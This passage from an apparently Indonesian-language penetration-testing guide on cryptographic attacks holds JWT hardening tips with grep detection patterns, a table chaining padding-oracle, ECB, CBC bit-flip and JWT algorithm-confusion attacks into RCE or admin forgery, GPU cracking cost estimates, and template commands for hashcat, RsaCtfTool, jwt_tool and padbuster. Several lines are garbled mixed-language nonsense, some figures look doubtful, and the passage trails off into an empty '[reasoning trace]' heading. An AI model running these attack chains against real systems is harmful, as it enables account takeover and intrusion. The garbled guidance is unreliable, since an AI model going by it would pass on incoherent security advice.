2. `kid` disanitasi; jangan gunakan `kid` langsung sebagai path/query tanpa allowlist.
3. `jku`, `x5u` harus ke allowlist domain sendiri (internal JWKS).
4. Kunci HMAC dan RSA tidak boleh berbagi kid namespace (confusion).
5. Auditor: grep source pattern untuk `jwt.decode(..., algorithms=` — jika `algorithms=None` dijumpai → temuan HIGH.

```bash
# grep cepat codebase:
grep -rEn "jwt\.(decode|verify).{0,80}(algorithms\s*=\s*None|algorithms\s*=\s*\[)" --include="*.py" src/
grep -rEn "jwt\.verify\(" --include="*.js" src/
grep -rEn "jwt.verify\(.*algorithms" --include="*.ts" src/
```

---

## 4.2.15 Operational Pitfalls Cross-Cut (Ringkasan)

### Reporting yang Salah Umum

- **"RSA dapat dipecahkan" padahal e=65537 dan d besar** — over-claim: tulis spesifik bounding kondisi (d<N^0.25 dsb) sebelum menyimpulkan temuan.
- ECB temuan harus **menyertakan dampak konkret data** — hanya karena ECB muncul bukan otomatis temuan (bila data random token — impact rendah). Niat eksploit dengan crown jewels (user data dedup patterns).
- Padding oracle impact selalu dalam scope **flat-sensitive**: MAC-then-encrypt violation, mention pre-auth statusses exploitable presente unauth bug chain.
- Bcrypt/bagus note: gunakan `--show` & `--left` untuk menghitung persentase dengan benar; jangan laporkan 100% accepted ketika selbst target 8..12 saja dicover maskbase.

Tabel kombinasi serangan chaining:

| Cacheable | chaining dengan | hasil amplifikasi |
|---|---|---|
| Length Extension | Path traversal server parse | Arbitrary file read → RCE chain |
| ECB cut-paste | serializer unsafe (Marshal/YAML) | RCE desi full system |
| Padding oracle | Java exception info disclosure | Account takeover via direct decrypt |
| CBC bit flip | Business logic field (role, amount) | Privilege escalation |
| JWT alg confusion | Public key extract `.well-known/jwks.json` | Full admin forgery |

### Speed & Cost Budget Table (Pentest engagement planning)

| Attack | Waktu untuk satu hash/target | Estimasi cloud cost (RTX 4090 rental) |
|---|---|---|
| Bcrypt 5 cost | 500-7500 guesses/s/GPU | ~$5 untuk 100M guesses |
| SHA512 | 5-10 GH/s/GPU | negosiable wildcard |
| NetNTLMv2 | ratusan GH/s | charles domain wallet |
| KeePass Argon2 | ≤ 50 H/s | kritis awal penilaian scope — jangan komit percobaan |
| RSA Fermat | detik | langsung |
| RSA Wiener | <1 detik | langsung |
| Padding oracle (dengan rate limit 50 rps) | 2-6 jam per 16-byte block via interleave async | bergantung rate limit negosiasi |

Library tool reference summary section updated here. Tools daya utama:
- **hashcat/john** — mode -m completeness, deep rules
- **RsaCtfTool** — RSA attacks engine comprehensively
- **jwt_tool** — JWT pentest toolkit
- **padbuster** — padding oracle CLI klasik
- # pip install pyjks, jwcrypto d2 - JWKS vulnerable internal testing.
- **greenalice/hashpumpy** — length ext binding.
- **sage binary from supported platform** — lattice attacks.

---

Daftar perintah lintas bab (ringkas cheat):

```bash
hashcat -m <mode> -a <attack> [mask|wordlist] [rules]
python3 RsaCtfTool.py --publickey pub.pem --attack all --private
jwt_tool <token> -X a|k|n|i|u
padbuster <url> <encrypted_block> <block_size> [options]
python3 batchgcd.py moduli.txt
python3 -m roca.detect --nested pubkeys.txt
```

---

## [reasoning trace]


